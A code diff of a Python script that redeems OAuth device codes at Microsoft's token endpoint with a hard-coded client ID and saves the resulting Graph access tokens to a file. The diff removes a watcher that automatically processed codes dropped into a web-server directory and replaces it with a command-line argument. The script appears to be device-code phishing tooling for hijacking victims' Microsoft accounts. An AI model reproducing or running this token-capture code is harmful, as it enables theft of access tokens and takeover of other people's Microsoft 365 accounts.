@@ -5,37 +5,22 @@ import os
 import requests
 from datetime import datetime
 
-from watchdog.observers import Observer
-from watchdog.events import FileSystemEventHandler
-
 # DON'T RUN THIS IN YOUR WEB ROOT AS IT WILL OUTPUT ACCESS TOKENS
 # TO A FILE CALLED "access_tokens.txt" IN THE SAME DIRECTORY. IF
 # YOU DO THIS YOU MAY EXPOSE ACCESS TOKENS ON YOUR WEB SERVER.
 
-# Initialize OAuth credentials as global variables
-client_id = None
-client_secret = None
-redirect_uri = None
-scope = None
-
-# Initialize a set to store processed OAuth codes
-processed_codes = set()
+# Oauth Code
+device_code = ""
 
 def complete_oauth_flow(auth_code):
-        global client_id, client_secret, redirect_uri, scope
-
-        if auth_code in processed_codes:
-        # If the auth code has already been processed, skip processing
-                return
-
         token_url = "https://login.microsoftonline.com/common/oauth2/token?api-version=1.0"
 
     # Define the request parameters
         data = {
-                "client_id": "d3590ed6-52b3-4102-aeff-aad2292ab01c",
-        "code": auth_code,
-        "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
-        "resource": "https://graph.microsoft.com"
+            "client_id": "d3590ed6-52b3-4102-aeff-aad2292ab01c",
+            "code": auth_code,
+            "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
+            "resource": "https://graph.microsoft.com"
         }
 
         # Make a POST request to obtain the access and refresh tokens
@@ -72,62 +57,16 @@ def complete_oauth_flow(auth_code):
                     print(response.text)
                     continue_flag = False
 
-class CodeFileHandler(FileSystemEventHandler):
-    def on_modified(self, event):
-        # Check if the event is a file and if it exists
-        if event.is_directory or not os.path.exists(event.src_path):
-            return
-
-        # Define a regular expression pattern to match the entire OAuth code block
-        oauth_code_pattern = r'OAuth Code:(.*?)\n\n\n'
-
-        # Read the contents of the modified file (codes.txt)
-        with open(event.src_path, 'r') as file:
-            content = file.read()
-
-            # Use regex to search for all OAuth code blocks in the content
-            matches = re.findall(oauth_code_pattern, content, re.DOTALL)
-
-            if matches:
-                # Extract the last OAuth code block
-                oauth_code_block = matches[-1].strip()
-                code_detected = f"\n\n[*] Processed OAuth Code: {oauth_code_block}"
-
-                # Check if the file is 'codes.txt' and delete it
-                if os.path.basename(event.src_path) == 'codes.txt':
-                    os.remove(event.src_path)
-
-                    if code_detected not in processed_codes:
-                        print("\n[*] Detected new OAuth code. Now attempting to complete the OAuth flow...")
-                        # Call the function to complete the OAuth flow
-                        complete_oauth_flow(oauth_code_block)
-                        processed_codes.add(code_detected)
-                        print(code_detected)
-
-                    # Call the function to complete the OAuth flow
-                    complete_oauth_flow(oauth_code_block)
-
 def main():
-    global client_id, client_secret, redirect_uri, scope
+    global device_code
 
     path = "/var/www/html/codes/"  # Directory where the 'codes.txt' file is located
     codes_file_path = os.path.join(path, "codes.txt")
-
-    # Check if the codes.txt file exists and delete it
-    if os.path.exists(codes_file_path):
-        os.remove(codes_file_path)
-
-    event_handler = CodeFileHandler()
-    observer = Observer()
-    observer.schedule(event_handler, path, recursive=False)
-    observer.start()
-    print("[*] Now watching for new OAuth codes written to", codes_file_path)
-    try:
-        while True:
-            time.sleep(1)
-    except KeyboardInterrupt:
-        observer.stop()
-    observer.join()
+    parser = argparse.ArgumentParser()
+    parser.add_argument("code")
+    args = parser.parse_args()
+    device_code = args.code
+    complete_oauth_flow(device_code)
 
 
 if __name__ == "__main__":
